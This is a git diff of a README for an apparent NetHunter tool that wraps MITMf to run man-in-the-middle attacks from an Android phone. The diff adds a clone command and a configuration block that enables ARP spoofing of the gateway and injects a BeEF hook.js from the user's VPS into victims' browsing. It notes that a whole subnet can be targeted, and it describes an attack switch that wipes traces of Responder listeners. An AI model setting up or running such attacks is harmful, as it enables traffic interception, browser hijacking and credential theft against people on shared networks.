@@ -6,7 +6,9 @@ This repo specifically fixes the functionality of the MITMf overlay on your NetH
 
 Using this is much simpler, just edit mitmf.cfg with your Android text editor of choice (I use Total Commander's text editing function) and set your options to 0 (OFF) or 1 (ON), and set variables such as your Beef Framework hook.js URL to the = sign, and then run
 
-<code>cd EasyNethunter;python wip_mitmf_improved.py</code>
+<code>cd Facerider;python wip_mitmf_improved.py</code>
+
+This can be configured to work as a Custom Command in the NetHunter App Menu
 
 Within it, is a simple two-button ON/OFF attack switch. Select 1 and press [Enter] to start the attack. Select 2 and [Enter] to stop the attack and wipe all traces of any background processes that may be running (Responder listeners on certain ports)
 
@@ -14,7 +16,7 @@ Within it, is a simple two-button ON/OFF attack switch. Select 1 and press [Ente
 
 Using your nethunter device, git clone this repo
 
-<code></code>
+<code>git clone https://github.com/tanc7/Facerider;cd Facerider</code>
 
 Then edit the mitmf.cfg file, personally I do not use nano on Kali Nethunter because it's wonky with the phone's display options as you shift between portrait and landscape. You can install Total Commander from the Android App Store instead.
 
@@ -26,11 +28,13 @@ The line "JS_URL = http://127.0.0.1:3000/hook.js" can be modified to point to a 
 
 Assuming you are using a wireless card and you have wireless connected your Nethunter device to a hotspot...
 
+<code>
 set INTERFACE = wlan0
 set INJECT = 1
 set JS_URL = http://yourvpsipaddress:3000/hook.js
 set SPOOF = 1
 set SPOOF_TYPE = 1
 set SPOOF_GATEWAY = The gateway you found with the route -n command // Alternatively  you can use the IPTools app on the Google Play Store to find your local router's IP but it's been shoddy.
+</code>
 
 SPOOF_TARGET can be left commented out if you wish to attack the entire subnet.
